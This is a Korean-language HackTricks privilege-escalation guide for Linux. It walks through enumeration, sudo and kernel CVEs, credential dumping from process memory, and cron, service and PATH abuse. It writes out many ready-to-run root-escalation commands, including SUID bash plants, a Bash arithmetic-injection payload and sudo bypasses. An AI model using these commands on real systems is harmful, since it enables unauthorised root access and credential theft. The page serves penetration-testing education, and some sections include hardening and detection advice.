# Linux 권한 상승

{{#include ../../../banners/hacktricks-training.md}}

## 시스템 정보

### OS 정보

실행 중인 OS에 대한 정보를 수집하는 것부터 시작합니다
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

`PATH` 변수 내부의 어떤 폴더에든 **쓰기 권한이 있다면**, 일부 library 또는 binary를 hijack할 수 있습니다:
```bash
echo $PATH
```
### 환경 정보

환경 변수에 흥미로운 정보, 비밀번호 또는 API 키가 있나요?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

커널 버전을 확인하고 권한 상승에 사용할 수 있는 exploit이 있는지 확인합니다.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
다음에서 취약한 kernel 목록과 이미 **compiled exploits**를 확인할 수 있습니다: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) 및 [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
**compiled exploits**를 확인할 수 있는 다른 사이트: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

해당 웹사이트에서 취약한 모든 kernel 버전을 추출하려면 다음과 같이 실행할 수 있습니다:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Kernel exploits를 검색하는 데 도움이 될 수 있는 Tools:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim에서 실행, kernel 2.x의 exploits만 확인)

항상 **Google에서 kernel version을 검색**하세요. 사용 중인 kernel version이 일부 kernel exploit에 기재되어 있을 수 있으며, 이를 통해 해당 exploit이 유효한지 확실히 확인할 수 있습니다.

추가 kernel exploitation techniques:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo 버전

다음에 나오는 취약한 sudo 버전을 기준으로:
```bash
searchsploit sudo
```
이 grep을 사용하여 sudo 버전이 취약한지 확인할 수 있습니다.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

1.9.17p1 이전의 Sudo 버전 (**1.9.14 - 1.9.17 < 1.9.17p1**)에서는 `/etc/nsswitch.conf` 파일이 사용자가 제어하는 디렉터리에서 로드될 때, 권한이 없는 로컬 사용자가 sudo의 `--chroot` 옵션을 통해 root로 권한을 상승시킬 수 있습니다.

해당 [취약점](https://nvd.nist.gov/vuln/detail/CVE-2025-32463)을 exploit하기 위한 [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot)가 있습니다. exploit을 실행하기 전에 사용 중인 `sudo` 버전이 취약한지, 그리고 `chroot` 기능을 지원하는지 확인하세요.

자세한 내용은 원본 [취약점 advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)를 참고하세요.

### Sudo host-based rules bypass (CVE-2025-32462)

1.9.17p1 이전의 Sudo (보고된 영향 범위: **1.8.8–1.9.17**)는 `sudo -h <host>`에서 사용자가 제공한 **hostname**을 **실제 hostname** 대신 사용하여 host-based sudoers rules를 평가할 수 있습니다. sudoers가 다른 host에서 더 광범위한 권한을 부여하는 경우, 해당 host를 로컬에서 **spoof**할 수 있습니다.

요구 사항:
- 취약한 sudo 버전
- Host-specific sudoers rules (host가 현재 hostname이나 `ALL`이 아님)

sudoers 패턴 예시:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
허용된 host를 spoofing하여 exploit:
```bash
sudo -h devbox id
sudo -h devbox -i
```
스푸핑된 이름의 확인이 지연되면 해당 이름을 `/etc/hosts`에 추가하거나, 로그/config에 이미 나타나는 hostname을 사용하여 DNS 조회를 피하세요.

#### sudo < v1.8.28

@sickrov 제공
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

이 vuln이 어떻게 exploit될 수 있는지에 대한 **example**는 **HTB의 smasher2 box**를 확인하세요.
```bash
dmesg 2>/dev/null | grep "signature"
```
### 추가 시스템 열거
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 가능한 방어 수단 열거

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

컨테이너 내부에 있다면 다음 container-security 섹션부터 확인한 후 runtime별 abuse 페이지로 이동하세요:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Drives

**무엇이 mount 및 unmount되어 있는지**, 어디에 어떤 이유로 되어 있는지 확인하세요. unmount된 항목이 있다면 이를 mount한 후 private info를 확인해 볼 수 있습니다
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 유용한 소프트웨어

유용한 바이너리 열거
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
또한 **컴파일러가 설치되어 있는지 확인**하세요. 일부 kernel exploit을 사용해야 할 때 유용합니다. 사용할 시스템(또는 유사한 시스템)에서 컴파일하는 것이 권장되기 때문입니다.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 취약한 Software 설치됨

설치된 **패키지와 서비스의 버전**을 확인하세요. 예를 들어 권한 상승에 악용할 수 있는 오래된 Nagios 버전이 있을 수 있습니다…\
더 의심스러운 설치 Software의 버전은 수동으로 확인하는 것이 좋습니다.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
머신에 SSH access가 있다면 **openVAS**를 사용하여 머신 내부에 설치된 outdated 및 vulnerable software를 확인할 수도 있습니다.

> [!NOTE] > _이 명령어는 대부분 쓸모없는 많은 정보를 표시하므로, 설치된 software version이 알려진 exploit에 취약한지 확인하는 OpenVAS 또는 유사한 application을 사용하는 것이 좋습니다._

## Processes

**어떤 processes**가 실행 중인지 확인하고, 어떤 process가 **필요 이상으로 많은 privileges**를 가지고 있는지 확인하세요(예를 들어 root가 실행하는 tomcat?).
```bash
ps aux
ps -ef
top -n 1
```
항상 실행 중인 [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md)가 있는지 확인하세요. 이를 악용하여 권한을 상승시킬 수 있습니다. **Linpeas**는 프로세스의 command line에서 `--inspect` 파라미터를 확인하여 이를 탐지합니다.\
또한 **프로세스 바이너리에 대한 권한**도 확인하세요. 다른 사용자의 바이너리를 덮어쓸 수 있을지도 모릅니다.

### 사용자 간 부모-자식 체인

**부모와 다른 사용자**로 실행되는 자식 프로세스가 항상 악성인 것은 아니지만, 이는 유용한 **triage 신호**입니다. 일부 전환은 예상되는 동작입니다 (`root`가 service user를 생성하거나, login manager가 session process를 생성하는 경우). 하지만 비정상적인 체인은 wrapper, debug helper, persistence 또는 취약한 runtime trust boundary를 드러낼 수 있습니다.

빠른 검토:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
예상하지 못한 chain을 발견하면 parent command line과 해당 동작에 영향을 주는 모든 파일(`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments)을 검사하세요. 실제 여러 privesc 경로에서 child 자체는 writable하지 않았지만, **parent-controlled config** 또는 helper chain은 writable했습니다.

### Deleted executables and deleted-open files

Runtime artifacts는 삭제된 **후에도** 여전히 접근 가능한 경우가 많습니다. 이는 privilege escalation뿐만 아니라, 이미 민감한 파일을 open한 process에서 evidence를 복구하는 데도 유용합니다.

Deleted executables를 확인하세요:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
`/proc/<PID>/exe`가 `(deleted)`를 가리키는 경우, 해당 프로세스는 여전히 메모리에 로드된 이전 binary image를 실행 중입니다. 이는 조사해야 할 강력한 신호입니다. 이유는 다음과 같습니다.

- 제거된 executable에 흥미로운 문자열이나 credentials가 포함되어 있을 수 있음
- 실행 중인 프로세스가 여전히 유용한 file descriptors를 노출할 수 있음
- 삭제된 privileged binary는 최근 tampering 또는 cleanup 시도를 나타낼 수 있음

deleted-open 파일을 전체적으로 수집하세요:
```bash
lsof +L1
```
흥미로운 descriptor를 찾았다면, 직접 복구하세요:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
이것은 프로세스가 삭제된 secret, script, database export 또는 flag file을 여전히 열어 둔 경우 특히 유용합니다.

### Process monitoring

[**pspy**](https://github.com/DominicBreuker/pspy)와 같은 도구를 사용하여 프로세스를 모니터링할 수 있습니다. 이는 자주 실행되는 취약한 프로세스 또는 특정 요구 사항이 충족될 때 실행되는 취약한 프로세스를 식별하는 데 매우 유용합니다.

### Process memory

일부 서버 서비스는 **메모리 내부에 credentials를 clear text로 저장**합니다.\
일반적으로 다른 사용자가 소유한 프로세스의 메모리를 읽으려면 **root privileges**가 필요하므로, 이는 보통 이미 root인 상태에서 더 많은 credentials를 찾으려 할 때 유용합니다.\
하지만 **일반 사용자도 자신이 소유한 프로세스의 메모리를 읽을 수 있다**는 점을 기억하세요.

> [!WARNING]
> 요즘 대부분의 시스템은 기본적으로 **ptrace를 허용하지 않습니다**. 즉, 권한이 없는 사용자가 소유한 다른 프로세스를 dump할 수 없습니다.
>
> _**/proc/sys/kernel/yama/ptrace_scope**_ 파일은 ptrace의 접근 가능 여부를 제어합니다.
>
> - **kernel.yama.ptrace_scope = 0**: 동일한 uid를 가진 모든 프로세스를 debug할 수 있습니다. ptracing이 작동하던 전통적인 방식입니다.
> - **kernel.yama.ptrace_scope = 1**: parent process만 debug할 수 있습니다.
> - **kernel.yama.ptrace_scope = 2**: CAP_SYS_PTRACE capability가 필요하므로 admin만 ptrace를 사용할 수 있습니다.
> - **kernel.yama.ptrace_scope = 3**: 어떠한 프로세스도 ptrace로 trace할 수 없습니다. 이 값이 설정되면 ptracing을 다시 활성화하기 위해 reboot이 필요합니다.

#### GDB

FTP service(예: FTP service)의 메모리에 접근할 수 있다면 Heap을 가져와 그 안에서 credentials를 검색할 수 있습니다.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB 스크립트
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

주어진 프로세스 ID에 대해 **maps는 해당 프로세스의 가상 주소 공간에 메모리가 어떻게 매핑되어 있는지** 보여 주며, **각 매핑된 영역의 권한**도 보여 줍니다. **mem** pseudo file은 **프로세스의 메모리 자체를 노출합니다**. **maps** file을 통해 어떤 **메모리 영역을 읽을 수 있는지**와 해당 영역의 offset을 알 수 있습니다. 이 정보를 사용해 **mem file에서 해당 위치로 seek한 다음 읽을 수 있는 모든 영역을** file에 dump합니다.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem`은 가상 메모리가 아닌 시스템의 **물리** 메모리에 대한 액세스를 제공합니다. 커널의 가상 주소 공간에는 /dev/kmem을 사용하여 액세스할 수 있습니다.\
일반적으로 `/dev/mem`은 **root** 및 **kmem** 그룹만 읽을 수 있습니다.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump는 Windows용 Sysinternals 도구 모음에 포함된 기존 ProcDump 도구를 Linux용으로 재구성한 도구입니다. [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)에서 받을 수 있습니다.
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### 도구

process memory를 dump하려면 다음을 사용할 수 있습니다:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root 요구 사항을 수동으로 제거하고 자신이 소유한 process를 dump할 수 있습니다
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf)의 Script A.5 (root 필요)

### Process Memory에서 Credentials 가져오기

#### 수동 예시

authenticator process가 실행 중인 것을 확인했다면:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
프로세스를 dump한 후(프로세스 메모리를 dump하는 다양한 방법은 앞의 섹션 참조) 메모리 내부에서 credentials를 검색할 수 있습니다:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

[**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) 도구는 **메모리에서 평문 자격 증명을 탈취**하고 일부 **잘 알려진 파일**에서도 탈취합니다. 올바르게 작동하려면 root 권한이 필요합니다.

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### 검색 정규식/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

웹 “Crontab UI” 패널(alseambusher/crontab-ui)이 root 권한으로 실행되고 loopback에만 바인딩되어 있어도, SSH local port-forwarding을 통해 접근한 뒤 권한이 있는 job을 생성하여 권한 상승을 수행할 수 있습니다.

Typical chain
- `ss -ntlp` / `curl -v localhost:8000`을 사용하여 loopback 전용 포트(예: 127.0.0.1:8000)와 Basic-Auth realm 확인
- 운영 artifact에서 credentials 찾기:
- `zip -P <password>`가 포함된 backups/scripts
- `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`를 노출하는 systemd unit
- Tunnel을 생성하고 login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 고권한 작업을 생성하고 즉시 실행합니다(SUID shell 생성):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 사용하세요:
```bash
/tmp/rootshell -p   # root shell
```
강화
- Crontab UI를 root로 실행하지 말고, 전용 사용자와 최소 권한으로 제한하세요.
- localhost에 바인딩하고 추가로 firewall/VPN을 통해 접근을 제한하세요. 비밀번호를 재사용하지 마세요.
- unit files에 secrets를 삽입하지 말고, secret stores 또는 root만 읽을 수 있는 EnvironmentFile을 사용하세요.
- 온디맨드 job 실행에 대한 audit/logging을 활성화하세요.

예약된 job 중 취약한 것이 있는지 확인하세요. root가 실행하는 script를 악용할 수 있을지도 모릅니다(wildcard vuln? root가 사용하는 파일을 수정할 수 있는가? symlinks를 사용할 수 있는가? root가 사용하는 directory에 특정 파일을 생성할 수 있는가?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
`run-parts`가 사용되는 경우 실제로 실행될 이름을 확인하세요:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
이는 false positive를 방지합니다. 쓰기 가능한 주기적 디렉터리는 payload 파일 이름이 로컬 `run-parts` 규칙과 일치할 때만 유용합니다.

### Cron path

예를 들어 _/etc/crontab_ 내부에서 PATH를 확인할 수 있습니다: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_사용자 "user"가 /home/user에 대한 쓰기 권한을 가지고 있음에 유의하세요_)

이 crontab에서 root 사용자가 path를 설정하지 않고 특정 명령이나 script를 실행하려는 경우입니다. 예: _\* \* \* \* root overwrite.sh_\
다음을 사용하여 root shell을 획득할 수 있습니다:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### wildcard를 사용하는 Cron 스크립트 (Wildcard Injection)

root가 스크립트를 실행하고 해당 명령에 “**\***”가 포함되어 있다면, 이를 악용해 예상치 못한 작업(예: privesc)을 수행할 수 있습니다. 예:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**wildcard가 _**/some/path/\***_ **와 같이 path 앞에 있으면 취약하지 않습니다(**_**./\***_ **도 마찬가지입니다).**

다음 페이지에서 wildcard exploitation에 대한 추가 tricks를 확인하세요:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### cron log parser에서의 Bash arithmetic expansion injection

Bash는 `((...))`, `$((...))`, `let`에서 arithmetic evaluation을 수행하기 전에 parameter expansion과 command substitution을 실행합니다. root 권한의 cron/parser가 신뢰할 수 없는 log field를 읽어 arithmetic context에 전달하면, attacker는 cron이 실행될 때 root 권한으로 실행되는 command substitution `$(...)`을 주입할 수 있습니다.

- 작동 원리: Bash에서는 expansion이 다음 순서로 수행됩니다: parameter/variable expansion, command substitution, arithmetic expansion, 그리고 word splitting 및 pathname expansion입니다. 따라서 `$(/bin/bash -c 'id > /tmp/pwn')0`과 같은 값은 먼저 치환되어 command가 실행되고, 이후 남은 숫자 `0`이 arithmetic에 사용되므로 script가 오류 없이 계속 실행됩니다.

- 일반적인 취약 패턴:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: 파싱되는 log에 attacker가 제어하는 text를 기록하여, 숫자처럼 보이는 field에 command substitution을 포함시키고 숫자로 끝나게 합니다. arithmetic이 유효하게 유지되도록 command가 stdout에 출력하지 않게 하거나 redirect해야 합니다.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

root가 실행하는 cron script를 **수정할 수 있다면**, 매우 쉽게 shell을 얻을 수 있습니다:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
root가 실행하는 **script가 사용자가 완전히 접근할 수 있는 directory**를 사용한다면, 해당 folder를 삭제하고 **사용자가 제어하는 script를 제공하는 다른 folder를 가리키는 symlink folder를 생성**하는 것이 유용할 수 있습니다.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 심볼릭 링크 검증 및 더 안전한 파일 처리

경로를 통해 파일을 읽거나 쓰는 privileged scripts/binaries를 검토할 때는 링크가 어떻게 처리되는지 확인하세요:

- `stat()`은 심볼릭 링크를 따라가 대상의 메타데이터를 반환합니다.
- `lstat()`은 링크 자체의 메타데이터를 반환합니다.
- `readlink -f`와 `namei -l`은 최종 대상을 확인하고 각 경로 구성 요소의 권한을 표시하는 데 유용합니다.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
For defenders/developers, symlink tricks에 대한 더 안전한 패턴은 다음과 같습니다:

- `O_EXCL` with `O_CREAT`: path가 이미 존재하면 실패합니다(attacker가 미리 생성한 links/files 차단).
- `openat()`: trusted directory file descriptor를 기준으로 상대 경로로 작업합니다.
- `mkstemp()`: secure permissions를 사용해 temporary files를 원자적으로 생성합니다.

### Custom-signed cron binaries with writable payloads
Blue teams는 때때로 custom ELF section을 덤프하고 vendor string을 grep한 뒤 root로 실행하여 cron-driven binaries를 "sign"합니다. 해당 binary가 group-writable인 경우(예: `root:devs 770`이 소유한 `/opt/AV/periodic-checks/monitor`) signing material을 leak할 수 있다면 section을 위조하여 cron task를 hijack할 수 있습니다:

1. `pspy`를 사용해 verification flow를 캡처합니다. Era에서는 root가 `objcopy --dump-section .text_sig=text_sig_section.bin monitor`를 실행한 다음 `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`을 실행하고 파일을 실행했습니다.
2. leaked key/config(`signing.zip`에서 가져옴)를 사용해 expected certificate를 재생성합니다:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. malicious replacement를 빌드하고(예: SUID bash를 drop하거나 SSH key를 추가) grep이 통과하도록 certificate를 `.text_sig`에 embed합니다:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. execute bits를 유지하면서 scheduled binary를 overwrite합니다:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. 다음 cron 실행을 기다립니다. naive signature check가 성공하면 payload가 root로 실행됩니다.

### Frequent cron jobs

1분마다 1, 2 또는 5분 간격으로 실행되는 processes를 찾기 위해 processes를 monitor할 수 있습니다. 이를 이용해 privileges를 escalate할 수 있을지도 모릅니다.

예를 들어 **1분 동안 0.1초마다 monitor**하고, **덜 실행된 commands순으로 정렬**한 다음 가장 많이 실행된 commands를 삭제하려면 다음을 실행할 수 있습니다:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**다음도 사용할 수 있습니다** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (시작되는 모든 프로세스를 모니터링하고 나열합니다).

### attacker가 설정한 mode bits를 보존하는 root 백업 (pg_basebackup)

root 소유의 cron이 사용자가 쓰기 가능한 database directory를 대상으로 `pg_basebackup` (또는 recursive copy)를 실행하도록 구성되어 있다면, **SUID/SGID binary**를 심어 백업 output에 동일한 mode bits와 함께 **root:root** 소유로 다시 복사되게 할 수 있습니다.

일반적인 discovery flow (low-priv DB user로 실행):
- `pspy`를 사용해 매분 `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/`와 같은 명령을 호출하는 root cron을 찾습니다.
- source cluster (예: `/var/lib/postgresql/14/main`)에 자신이 쓰기 권한을 가지며, job 실행 후 destination (`/opt/backups/current`)의 소유자가 root가 되는지 확인합니다.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
이는 `pg_basebackup`이 cluster를 복사할 때 파일 mode bits를 유지하기 때문에 작동합니다. root가 실행하면 대상 파일은 **root ownership + 공격자가 선택한 SUID/SGID**를 상속합니다. 권한을 유지하고 executable location에 기록하는 유사한 privileged backup/copy routine도 취약합니다.

### Invisible cron jobs

**comment 뒤에 carriage return을 넣으면**(newline character 없이) cronjob을 생성할 수 있으며, cron job이 정상적으로 작동합니다. 예시(캐리지 리턴 문자를 확인하세요):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
이러한 종류의 은밀한 진입을 탐지하려면 제어 문자를 표시하는 도구를 사용하여 cron 파일을 검사합니다:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## 서비스

### 쓰기 가능한 _.service_ 파일

어떤 `.service` 파일에든 쓸 수 있는지 확인하세요. 쓸 수 있다면 해당 파일을 **수정하여**, 서비스가 **시작**, **재시작** 또는 **중지**될 때 **backdoor를 실행**하도록 만들 수 있습니다(컴퓨터가 재부팅될 때까지 기다려야 할 수도 있습니다).\
예를 들어 `.service` 파일 내부에 **`ExecStart=/tmp/script.sh`**를 사용하여 backdoor를 생성할 수 있습니다.

### 쓰기 가능한 서비스 바이너리

서비스가 실행하는 바이너리에 **쓰기 권한**이 있다면 해당 바이너리를 backdoor로 변경할 수 있습니다. 그러면 서비스가 다시 실행될 때 backdoor가 실행됩니다.

### systemd PATH - 상대 경로

다음 명령으로 **systemd**가 사용하는 PATH를 확인할 수 있습니다:
```bash
systemctl show-environment
```
어떤 경로의 폴더에든 **write**할 수 있다면 **escalate privileges**할 수 있습니다. 다음과 같은 **service configurations** 파일에서 사용되는 **relative paths**를 찾아야 합니다:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
그런 다음, 작성 가능한 systemd PATH 폴더 안에 상대 경로 binary와 **동일한 이름의** **실행 가능한** 파일을 생성합니다. 서비스에 취약한 작업(**Start**, **Stop**, **Reload**)을 실행하도록 요청하면 **backdoor가 실행**됩니다(권한이 없는 사용자는 일반적으로 서비스를 시작하거나 중지할 수 없지만, `sudo -l`을 사용해 가능한지 확인하세요).

**`man systemd.service`를 사용하여 서비스에 대해 자세히 알아보세요.**

## **Timers**

**Timers**는 이름이 `**.timer**`로 끝나는 systemd unit file이며, `**.service**` 파일 또는 이벤트를 제어합니다. **Timers**는 calendar time event와 monotonic time event를 기본적으로 지원하므로 cron의 대안으로 사용할 수 있으며, 비동기적으로 실행할 수 있습니다.
